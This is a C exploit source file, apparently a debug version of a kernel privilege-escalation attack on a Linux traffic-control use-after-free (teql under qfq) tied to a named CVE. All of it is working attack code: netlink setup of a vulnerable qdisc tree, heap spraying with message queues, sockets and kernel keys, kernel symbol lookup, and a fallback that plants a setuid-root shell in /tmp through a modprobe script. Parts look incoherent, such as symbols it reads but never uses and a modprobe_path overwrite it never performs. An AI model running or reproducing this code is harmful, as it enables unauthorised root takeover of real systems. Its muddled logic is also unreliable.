/*
 * CVE-2026-23074 teql UAF Exploit - DEBUG VERSION
 * Dengan multiple heap spray techniques
 */

#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <errno.h>
#include <fcntl.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <sys/wait.h>
#include <sys/msg.h>
#include <sys/syscall.h>
#include <sys/stat.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <linux/netlink.h>
#include <linux/rtnetlink.h>
#include <linux/pkt_sched.h>
#include <net/if.h>
#include <pthread.h>
#include <time.h>
#include <stdint.h>
#include <signal.h>
#include <linux/keyctl.h>

/* =============================================
 *  DEFINES YANG MUNGKIN HILANG
 * ============================================= */
#ifndef KEY_SPEC_PROCESS_KEYRING
#define KEY_SPEC_PROCESS_KEYRING -2
#endif

#ifndef __NR_add_key
#define __NR_add_key 286
#endif

#ifndef TCA_QFQ_WEIGHT
#define TCA_QFQ_WEIGHT 1
#endif

#ifndef TCA_QFQ_LMAX
#define TCA_QFQ_LMAX 2
#endif

/* =============================================
 *  STRUCTURES
 * ============================================= */
struct list_head {
    struct list_head *next, *prev;
};

struct tc_qfq_qopt {
    unsigned int weight;
    unsigned int max_pkt_len;
};

/* =============================================
 *  GLOBALS
 * ============================================= */
static int nl_fd = -1;
static uint32_t seq = 0;
static volatile int got_root = 0;

static void die(const char *msg) { 
    perror(msg); 
    exit(1); 
}

static void exec_shell(void) {
    if (getuid() == 0) {
        puts("\n[+] SUCCESS! ROOT SHELL SPAWNED!");
        setuid(0);
        setgid(0);
        execl("/bin/bash", "bash", NULL);
        execl("/bin/sh", "sh", NULL);
    }
}

static uint64_t get_kernel_addr(const char *symbol) {
    FILE *f = fopen("/proc/kallsyms", "r");
    if (!f) return 0;
    char line[256];
    uint64_t addr = 0;
    while (fgets(line, sizeof(line), f)) {
        if (strstr(line, symbol)) {
            sscanf(line, "%lx", &addr);
            break;
        }
    }
    fclose(f);
    if (addr) printf("[*] Found %s at 0x%lx\n", symbol, addr);
    return addr;
}

static int netlink_send_recv(struct nlmsghdr *nlh) {
    struct sockaddr_nl sa = { .nl_family = AF_NETLINK };
    struct iovec iov = { nlh, nlh->nlmsg_len };
    struct msghdr msg = { &sa, sizeof(sa), &iov, 1, NULL, 0, 0 };
    if (sendmsg(nl_fd, &msg, 0) < 0) return -1;
    char buf[8192];
    struct iovec r_iov = { buf, sizeof(buf) };
    struct msghdr r_msg = { &sa, sizeof(sa), &r_iov, 1, NULL, 0, 0 };
    return recvmsg(nl_fd, &r_msg, 0);
}

static void tc_qdisc_add_root(void) {
    char buf[4096] = {0};
    struct nlmsghdr *nlh = (struct nlmsghdr *)buf;
    struct tcmsg *tcm = (struct tcmsg *)(nlh + 1);
    struct rtattr *rta;
    nlh->nlmsg_len = NLMSG_LENGTH(sizeof(struct tcmsg));
    nlh->nlmsg_type = RTM_NEWQDISC;
    nlh->nlmsg_flags = NLM_F_REQUEST | NLM_F_CREATE | NLM_F_EXCL;
    nlh->nlmsg_seq = ++seq;
    tcm->tcm_family = AF_UNSPEC;
    tcm->tcm_ifindex = if_nametoindex("dummy0");
    tcm->tcm_parent = TC_H_ROOT;
    tcm->tcm_handle = 0x10000;
    rta = (struct rtattr *)((char *)nlh + NLMSG_ALIGN(nlh->nlmsg_len));
    rta->rta_type = TCA_KIND;
    rta->rta_len = RTA_LENGTH(4);
    memcpy(RTA_DATA(rta), "qfq", 4);
    nlh->nlmsg_len = NLMSG_ALIGN(nlh->nlmsg_len) + RTA_ALIGN(rta->rta_len);
    netlink_send_recv(nlh);
    printf("[+] qfq root added\n");
}

static void tc_class_add(uint32_t classid, uint32_t weight, uint32_t lmax) {
    char buf[4096] = {0};
    struct nlmsghdr *nlh = (struct nlmsghdr *)buf;
    struct tcmsg *tcm = (struct tcmsg *)(nlh + 1);
    struct rtattr *rta, *nest;
    struct tc_qfq_qopt opt;
    nlh->nlmsg_len = NLMSG_LENGTH(sizeof(struct tcmsg));
    nlh->nlmsg_type = RTM_NEWTCLASS;
    nlh->nlmsg_flags = NLM_F_REQUEST | NLM_F_CREATE | NLM_F_EXCL;
    nlh->nlmsg_seq = ++seq;
    tcm->tcm_family = AF_UNSPEC;
    tcm->tcm_ifindex = if_nametoindex("dummy0");
    tcm->tcm_parent = 0x10000;
    tcm->tcm_handle = classid;
    rta = (struct rtattr *)((char *)nlh + NLMSG_ALIGN(nlh->nlmsg_len));
    rta->rta_type = TCA_KIND;
    rta->rta_len = RTA_LENGTH(4);
    memcpy(RTA_DATA(rta), "qfq", 4);
    nlh->nlmsg_len = NLMSG_ALIGN(nlh->nlmsg_len) + RTA_ALIGN(rta->rta_len);
    rta = (struct rtattr *)((char *)nlh + NLMSG_ALIGN(nlh->nlmsg_len));
    rta->rta_type = TCA_OPTIONS;
    rta->rta_len = RTA_LENGTH(0);
    nest = rta;
    opt.weight = weight;
    opt.max_pkt_len = lmax;
    rta = (struct rtattr *)((char *)nest + RTA_ALIGN(nest->rta_len));
    rta->rta_type = TCA_QFQ_WEIGHT;
    rta->rta_len = RTA_LENGTH(sizeof(opt.weight));
    memcpy(RTA_DATA(rta), &opt.weight, sizeof(opt.weight));
    nest->rta_len = RTA_ALIGN(nest->rta_len) + RTA_ALIGN(rta->rta_len);
    rta = (struct rtattr *)((char *)nest + RTA_ALIGN(nest->rta_len));
    rta->rta_type = TCA_QFQ_LMAX;
    rta->rta_len = RTA_LENGTH(sizeof(opt.max_pkt_len));
    memcpy(RTA_DATA(rta), &opt.max_pkt_len, sizeof(opt.max_pkt_len));
    nest->rta_len = RTA_ALIGN(nest->rta_len) + RTA_ALIGN(rta->rta_len);
    nlh->nlmsg_len = NLMSG_ALIGN(nlh->nlmsg_len) + RTA_ALIGN(nest->rta_len);
    netlink_send_recv(nlh);
    printf("[+] class 0x%x added (weight=%u, lmax=%u)\n", classid, weight, lmax);
}

static void tc_qdisc_add_child(uint32_t parent, const char *kind, const void *opts, size_t opt_len) {
    char buf[4096] = {0};
    struct nlmsghdr *nlh = (struct nlmsghdr *)buf;
    struct tcmsg *tcm = (struct tcmsg *)(nlh + 1);
    struct rtattr *rta;
    static uint32_t handle = 2;
    nlh->nlmsg_len = NLMSG_LENGTH(sizeof(struct tcmsg));
    nlh->nlmsg_type = RTM_NEWQDISC;
    nlh->nlmsg_flags = NLM_F_REQUEST | NLM_F_CREATE | NLM_F_EXCL;
    nlh->nlmsg_seq = ++seq;
    tcm->tcm_family = AF_UNSPEC;
    tcm->tcm_ifindex = if_nametoindex("dummy0");
    tcm->tcm_parent = parent;
    tcm->tcm_handle = handle++;
    rta = (struct rtattr *)((char *)nlh + NLMSG_ALIGN(nlh->nlmsg_len));
    rta->rta_type = TCA_KIND;
    rta->rta_len = RTA_LENGTH(strlen(kind) + 1);
    memcpy(RTA_DATA(rta), kind, strlen(kind) + 1);
    nlh->nlmsg_len = NLMSG_ALIGN(nlh->nlmsg_len) + RTA_ALIGN(rta->rta_len);
    if (opts && opt_len) {
        rta = (struct rtattr *)((char *)nlh + NLMSG_ALIGN(nlh->nlmsg_len));
        rta->rta_type = TCA_OPTIONS;
        rta->rta_len = RTA_LENGTH(opt_len);
        memcpy(RTA_DATA(rta), opts, opt_len);
        nlh->nlmsg_len = NLMSG_ALIGN(nlh->nlmsg_len) + RTA_ALIGN(rta->rta_len);
    }
    netlink_send_recv(nlh);
    printf("[+] %s qdisc added under 0x%x\n", kind, parent);
}

static void update_class_lmax(uint32_t classid, uint32_t new_lmax) {
    char buf[4096] = {0};
    struct nlmsghdr *nlh = (struct nlmsghdr *)buf;
    struct tcmsg *tcm = (struct tcmsg *)(nlh + 1);
    struct rtattr *rta, *nest;
    struct tc_qfq_qopt opt;
    nlh->nlmsg_len = NLMSG_LENGTH(sizeof(struct tcmsg));
    nlh->nlmsg_type = RTM_NEWTCLASS;
    nlh->nlmsg_flags = NLM_F_REQUEST;
    nlh->nlmsg_seq = ++seq;
    tcm->tcm_family = AF_UNSPEC;
    tcm->tcm_ifindex = if_nametoindex("dummy0");
    tcm->tcm_parent = 0x10000;
    tcm->tcm_handle = classid;
    rta = (struct rtattr *)((char *)nlh + NLMSG_ALIGN(nlh->nlmsg_len));
    rta->rta_type = TCA_KIND;
    rta->rta_len = RTA_LENGTH(4);
    memcpy(RTA_DATA(rta), "qfq", 4);
    nlh->nlmsg_len = NLMSG_ALIGN(nlh->nlmsg_len) + RTA_ALIGN(rta->rta_len);
    rta = (struct rtattr *)((char *)nlh + NLMSG_ALIGN(nlh->nlmsg_len));
    rta->rta_type = TCA_OPTIONS;
    rta->rta_len = RTA_LENGTH(0);
    nest = rta;
    opt.weight = 1;
    opt.max_pkt_len = new_lmax;
    rta = (struct rtattr *)((char *)nest + RTA_ALIGN(nest->rta_len));
    rta->rta_type = TCA_QFQ_WEIGHT;
    rta->rta_len = RTA_LENGTH(sizeof(opt.weight));
    memcpy(RTA_DATA(rta), &opt.weight, sizeof(opt.weight));
    nest->rta_len = RTA_ALIGN(nest->rta_len) + RTA_ALIGN(rta->rta_len);
    rta = (struct rtattr *)((char *)nest + RTA_ALIGN(nest->rta_len));
    rta->rta_type = TCA_QFQ_LMAX;
    rta->rta_len = RTA_LENGTH(sizeof(opt.max_pkt_len));
    memcpy(RTA_DATA(rta), &opt.max_pkt_len, sizeof(opt.max_pkt_len));
    nest->rta_len = RTA_ALIGN(nest->rta_len) + RTA_ALIGN(rta->rta_len);
    nlh->nlmsg_len = NLMSG_ALIGN(nlh->nlmsg_len) + RTA_ALIGN(nest->rta_len);
    printf("[!] Updating class 0x%x lmax to %u (TRIGGERING UAF)\n", classid, new_lmax);
    netlink_send_recv(nlh);
}

static void send_packets(int count) {
    int s = socket(AF_INET, SOCK_DGRAM, 0);
    if (s < 0) return;
    struct sockaddr_in dst;
    dst.sin_family = AF_INET;
    dst.sin_port = htons(9999);
    inet_pton(AF_INET, "192.0.2.1", &dst.sin_addr);
    char pkt[64] = {0};
    for (int i = 0; i < count; i++) {
        sendto(s, pkt, sizeof(pkt), 0, (struct sockaddr *)&dst, sizeof(dst));
        usleep(1000);
    }
    close(s);
    printf("[+] Sent %d packets\n", count);
}

/* MASSIVE HEAP SPRAY - Multiple techniques */
static int spray_msgs[1000];
static int spray_idx = 0;

static void spray_msg(void) {
    struct {
        long mtype;
        char mtext[256];
    } msg;
    msg.mtype = 1;
    memset(msg.mtext, 0x41, 256);
    
    for (int size = 64; size <= 1024; size *= 2) {
        for (int i = 0; i < 200; i++) {
            int qid = msgget(IPC_PRIVATE, 0600 | IPC_CREAT);
            if (qid >= 0 && spray_idx < 1000) {
                spray_msgs[spray_idx++] = qid;
                msgsnd(qid, &msg, size - sizeof(long), 0);
            }
        }
    }
    printf("[+] Sprayed %d messages\n", spray_idx);
}

static void spray_socket(void) {
    int fds[100];
    for (int i = 0; i < 100; i++) {
        int sv[2];
        if (socketpair(AF_UNIX, SOCK_STREAM, 0, sv) == 0) {
            char buf[512];
            memset(buf, 0x42, 512);
            write(sv[0], buf, 512);
            close(sv[0]);
            fds[i] = sv[1];
        }
    }
    printf("[+] Sprayed 100 socket buffers\n");
}

static void spray_keyctl(void) {
    for (int i = 0; i < 500; i++) {
        char desc[32];
        snprintf(desc, sizeof(desc), "spray%d", i);
        syscall(__NR_add_key, "user", desc, "AAAA", 4, KEY_SPEC_PROCESS_KEYRING);
    }
    printf("[+] Sprayed 500 keys\n");
}

/* Create file to trigger modprobe */
static void setup_modprobe_payload(void) {
    FILE *f = fopen("/tmp/modprobe_payload", "w");
    if (f) {
        fprintf(f, "#!/bin/sh\n");
        fprintf(f, "cp /bin/sh /tmp/rootshell\n");
        fprintf(f, "chmod u+s /tmp/rootshell\n");
        fprintf(f, "chmod 777 /tmp/rootshell\n");
        fclose(f);
        chmod("/tmp/modprobe_payload", 0755);
    }
    
    /* Create unknown binary to trigger modprobe */
    system("echo 'MZ' > /tmp/unknown.bin");
    chmod("/tmp/unknown.bin", 0755);
    printf("[+] Modprobe payload prepared\n");
}

int main(void) {
    printf("\n========================================\n");
    printf("CVE-2026-23074 teql UAF Exploit (DEBUG)\n");
    printf("========================================\n");
    printf("[*] UID=%d EUID=%d\n", getuid(), geteuid());
    
    /* Get important kernel symbols */
    uint64_t commit_creds = get_kernel_addr("commit_creds");
    uint64_t prepare_kernel_cred = get_kernel_addr("prepare_kernel_cred");
    uint64_t modprobe_path = get_kernel_addr("modprobe_path");
    
    /* Load required modules */
    system("modprobe teql 2>/dev/null");
    system("modprobe sch_netem 2>/dev/null");
    system("modprobe sch_qfq 2>/dev/null");
    system("modprobe dummy 2>/dev/null");
    
    /* Setup interface */
    system("ip link del dummy0 2>/dev/null");
    system("ip link add dummy0 type dummy 2>/dev/null");
    system("ip link set dummy0 up 2>/dev/null");
    printf("[+] Interface dummy0 ready\n");
    
    /* Open netlink */
    nl_fd = socket(AF_NETLINK, SOCK_DGRAM, NETLINK_ROUTE);
    if (nl_fd < 0) die("socket netlink");
    
    /* Setup vulnerable configuration */
    printf("\n[*] Setting up vulnerable qdisc tree...\n");
    tc_qdisc_add_root();
    usleep(100000);
    
    struct {
        struct tc_netem_qopt n;
    } netem_opt = { .n = { .limit = 1000, .latency = 6400 } }; /* 6.4 seconds in ms */
    
    tc_class_add(0x10001, 15, 16384);
    tc_qdisc_add_child(0x10001, "netem", &netem_opt, sizeof(netem_opt));
    
    tc_class_add(0x10002, 1, 1514);
    tc_qdisc_add_child(0x10002, "teql", NULL, 0);
    
    printf("\n[!] Vulnerable configuration:\n");
    printf("    qfq (1:0)\n");
    printf("    ├── class 1:1 (netem, delay 6.4s)\n");
    printf("    └── class 1:2 (teql) <- VULNERABLE\n");
    
    /* ===== EXPLOIT SEQUENCE ===== */
    printf("\n[*] STAGE 1: Sending packet to delay path (netem)...\n");
    send_packets(1);  /* This packet will be delayed for 6.4 seconds */
    
    sleep(1);
    
    printf("\n[*] STAGE 2: Sending packets to teql class...\n");
    send_packets(10); /* These make qlen=0 on teql */
    
    sleep(1);
    
    printf("\n[*] STAGE 3: Triggering UAF via lmax update...\n");
    update_class_lmax(0x10002, 9000); /* This frees aggregate pointer but doesn't deactivate */
    
    printf("\n[*] STAGE 4: Waiting for delayed packet (6.4 seconds)...\n");
    printf("    [UAF should occur when delayed packet returns]\n");
    sleep(7); /* Wait 6.4s + buffer */
    
    printf("\n[*] STAGE 5: Heap spray to reclaim freed memory...\n");
    spray_msg();
    spray_socket();
    spray_keyctl();
    
    printf("\n[*] STAGE 6: Trigger dangling pointer...\n");
    send_packets(1); /* This should hit the freed memory */
    
    /* Wait to see if we get root */
    sleep(2);
    
    if (getuid() == 0) {
        printf("\n[!!!] SUCCESS! Root privileges acquired!\n");
        exec_shell();
        return 0;
    }
    
    /* Try modprobe path overwrite as fallback */
    printf("\n[*] Trying alternative: modprobe_path overwrite\n");
    setup_modprobe_payload();
    
    /* Try to execute unknown binary to trigger modprobe */
    printf("[*] Attempting to trigger modprobe...\n");
    system("/tmp/unknown.bin 2>/dev/null");
    sleep(1);
    
    if (access("/tmp/rootshell", X_OK) == 0) {
        printf("[+] Found rootshell! Executing...\n");
        system("/tmp/rootshell");
    }
    
    if (getuid() == 0) {
        exec_shell();
    }
    
    /* Cleanup */
    printf("\n[-] Exploit failed. Diagnostic info:\n");
    system("dmesg | tail -30 | grep -E 'teql|qfq|BUG|Oops|UAF|use-after-free' || echo 'No kernel Oops messages'");
    system("tc qdisc del dev dummy0 root 2>/dev/null");
    system("ip link del dummy0 2>/dev/null");
    close(nl_fd);
    
    printf("\nPossible issues:\n");
    printf("1. Kernel already patched (check: dmesg | grep teql)\n");
    printf("2. SMEP/SMAP/KPTI preventing execution\n");
    printf("3. Wrong offsets - need to adapt for your kernel\n");
    printf("4. Timing mismatch - try adjusting DELAY_US\n");
    
    return 1;
}
